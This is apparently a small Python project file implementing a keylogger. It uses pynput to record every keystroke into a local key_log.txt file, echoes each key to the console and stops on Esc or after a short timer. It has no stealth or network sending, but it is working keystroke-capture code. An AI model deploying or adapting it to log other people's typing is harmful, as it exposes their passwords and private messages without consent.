import time
from pynput.keyboard import Key, Listener
import threading

file_path = "C:\\Users\\PC-Service\\OneDrive\\Desktop\\project\\files\\"
extend = "\\"
keys_information = "key_log.txt"

keys = []
count = 0
stop_logging = False  # Global variable to control logging
start_time = time.time()  # Track start time
duration = 10  # Default duration, can be modified in main script

def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(file_path + extend + keys_information, "a", encoding="utf-8") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    global stop_logging
    if key == Key.esc or stop_logging:
        stop_logging = True
        return False

def stop_listener_after_duration():
    global stop_logging
    time.sleep(duration)
    stop_logging = True  # Set the flag to stop logging

def start_listener():
    listener = Listener(on_press=on_press, on_release=on_release)
    listener_thread = threading.Thread(target=listener.run)
    listener_thread.start()
    
    stop_timer_thread = threading.Thread(target=stop_listener_after_duration)  # Timer thread
    stop_timer_thread.start()

    listener_thread.join()  # Wait for listener to stop
    stop_timer_thread.join()
